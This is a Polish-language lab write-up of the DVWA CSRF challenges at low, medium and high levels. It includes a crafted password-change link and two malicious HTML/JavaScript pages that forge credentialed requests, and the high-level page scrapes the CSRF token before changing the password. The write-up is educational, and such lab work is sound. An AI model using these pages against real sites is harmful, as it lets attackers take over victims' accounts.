# CSRF - Cross Site Request Forgering
## Opis techniki
<blockquote>Atak CSRF w tym przypadku dotyczył będzie formularza zmiany hasła, który nie posiada dodatkowych zabezpieczeń, takich jak captcha czy podanie starego hasła. W takiej sytuacji, atakujący może wykorzystać te braki w zabezpieczeniach, aby zmusić użytkowników do niechcianych zmian hasła.

W typowym scenariuszu ataku CSRF na formularz zmiany hasła, atakujący przygotowuje specjalnie spreparowaną stronę, która zawiera ukryte żądanie zmiany hasła. Może to być zwykły link, który wydaje się niewinny lub atrakcyjny dla użytkownika. Kiedy użytkownik kliknie w ten link, żądanie zmiany hasła zostaje automatycznie wykonane w tle, wykorzystując uwierzytelnienie użytkownika na stronie.

W konsekwencji, jeśli użytkownik jest zalogowany na swoje konto na stronie, atakujący może dowolnie zmieniać hasło w imieniu ofiary, bez jej wiedzy i zgody. Użytkownik nie jest świadomy tego, że jego hasło zostało zmienione, a atakujący uzyskuje pełną kontrolę nad kontem.

Aby chronić się przed atakami CSRF w przypadku formularzy zmiany hasła, ważne jest wprowadzenie odpowiednich zabezpieczeń. Przede wszystkim, aplikacja internetowa powinna stosować mechanizmy weryfikacji, takie jak token CSRF, który jest generowany dla każdego żądania i musi być przesłany wraz z żądaniem zmiany hasła. Serwer sprawdza, czy token jest prawidłowy, aby zweryfikować, czy żądanie pochodzi od prawidłowego źródła.

To jednak może nie wystarczyć, co udowodni laboratorium wysokim poziomie trudności. Zaleca się więc stosowanie dodatkowych warunków, takich jak potwierdzenie starego hasła i/lub rozwiązanie captchy, aby uniemożliwić zmianę hasła bez rzeczywistej intencji użytkownika.</blockquote>

## DVWA labs

- [DVWA CSRF #1 - Low](#dvwa-csrf-1---low)

- [DVWA CSRF #2 - Medium](#dvwa-csrf-2---medium)

- [DVWA CSRF #3 - High](#dvwa-csrf-3---high)


<br/>

## DVWA Brute Force #1 - Low
Na niskim poziomie trudności musimy mieć na uwadze następujące cechy laboratorium:
* Dane do zmiany hasła są przesyłane w parametrach GET

Powoduje to, że jedyne co musi zrobić atakujący, to przekonać ofiarę, by będąc zalogowana w docelowej web aplikacji - kliknęła w specjalnie przygotowany link.

#### Przykładowy link powodujący automatyczną zmianę hasła
<http://10.10.14.17/vulnerabilities/csrf/?password_new=low&password_conf=low&Change=Change>

#### Efekt kliknięcia w link:
![alt text](https://github.com/249064/CBE-BAW-2023/raw/main/res/image_2023-06-09_015237284.png "Po kliknięciu w link wysłane żądanie powoduje automatyczną zmianę hasła")



<br/>

<br/>
<br/>

## DVWA Brute Force #2 - Medium
Na średnim poziomie trudności musimy mieć na uwadze następujące cechy laboratorium:
* Dane do zmiany hasła są przesyłane w parametrach GET
* CORS

![alt text](https://github.com/249064/CBE-BAW-2023/raw/main/res/image_2023-06-09_013102526.png "Plik ze złośliwą stroną został wgrany na serwer.")

#### Złośliwa strona `html` 

```html
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Medium</title>
</head>
<body>
    <script>
        var pass = 'medium';
        var theUrl = 'http://10.10.14.17/vulnerabilities/csrf/?password_new=' + pass + '&password_conf=' + pass + '&Change=Change';
        fetch(theUrl, {
            method: 'GET',
            credentials: 'include'
        }).then(function(response) {
            return response.text();
        }).then(function(text) {
            var parser = new DOMParser();
            var responseDoc = parser.parseFromString(text, "text/html");
            var preElements = responseDoc.getElementsByTagName('pre');
            if (preElements.length > 0) {
                var preText = preElements[0].textContent;
                console.log(preText);
            } else {
                console.log("No <pre> elements found in the response.");
            }
        });
    </script>
</body>
</html>
```

#### Efekt wejścia na stronę:
![alt text](https://github.com/249064/CBE-BAW-2023/raw/main/res/image_2023-06-09_013039891.png "Po wejściu na złośliwą stronę skrypt JS korzystając z zalogowanej sesji użytkownika - dokonuje zmiany hasła")



<br/>

<br/>
<br/>

## DVWA Brute Force #3 - High
Na wysokim poziomie trudności musimy mieć na uwadze następujące cechy laboratorium:
* Dane do zmiany hasła są przesyłane w parametrach GET
* CORS
* Każde żądanie musi zawierać ważny token CSRF

![alt text](https://github.com/249064/CBE-BAW-2023/raw/main/res/image_2023-06-09_003649344.png "Plik ze złośliwą stroną został wgrany na serwer.")

#### Złośliwa strona `html` 

```html
<!DOCTYPE html>
<html>
<head>
    <title>HTTP File</title>
</head>
<body>
    <script>
        var theUrl = 'http://10.10.14.17/vulnerabilities/csrf/';
        var pass = 'high';

        fetch(theUrl, {
            method: 'GET',
            credentials: 'include'
        }).then(function(response) {
            return response.text();
        }).then(function(text) {
            var parser = new DOMParser();
            var doc = parser.parseFromString(text, "text/html");
            var token = doc.getElementsByName('user_token')[0].value;
            console.log("Retrieved CSRF token: "+token);
            new_url = theUrl + '?password_new=' + pass + '&password_conf=' + pass + '&Change=Change&user_token=' + token + '&Change=Change';
            fetch(new_url, {
                method: 'GET',
                credentials: 'include'
            }).then(function(response) {
                return response.text();
            }).then(function(text) {
                var responseDoc = parser.parseFromString(text, "text/html");
                var preElements = responseDoc.getElementsByTagName('pre');
                if (preElements.length > 0) {
                    var preText = preElements[0].textContent;
                    console.log(preText);
                } else {
                    console.log("No <pre> elements found in the response.");
                }
            });
        });
    </script>
</body>
</html>
```

#### Efekt wejścia na stronę:
![alt text](https://github.com/249064/CBE-BAW-2023/raw/main/res/image_2023-06-09_005251539.png "Po wejściu na złośliwą stronę skrypt JS uzyskuje najpierw token CSRF, a później - korzystając z zalogowanej sesji użytkownika - dokonuje zmiany hasła")


<br/>
